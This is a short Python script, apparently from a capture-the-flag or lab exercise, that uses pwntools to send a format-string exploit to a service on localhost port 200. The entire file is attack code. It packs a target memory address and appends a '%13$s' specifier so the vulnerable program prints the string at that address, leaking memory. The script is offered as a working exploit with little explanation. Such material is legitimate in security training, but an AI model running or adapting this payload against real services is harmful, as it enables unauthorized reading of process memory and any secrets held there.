from pwn import *

host = "127.0.0.1" #Local host
portNum = 200 #Given in the program

targetAddress = "\xb4\xd0\x04\x08"

exploit = f"{targetAddress}%13$s"#Means to print out the 13th string
eol = b'\r\n' #To mark the end of recieve on server side
print('sending exploit: '+exploit+"\n\n")
io=connect(host, portNum)
io.send(exploit)
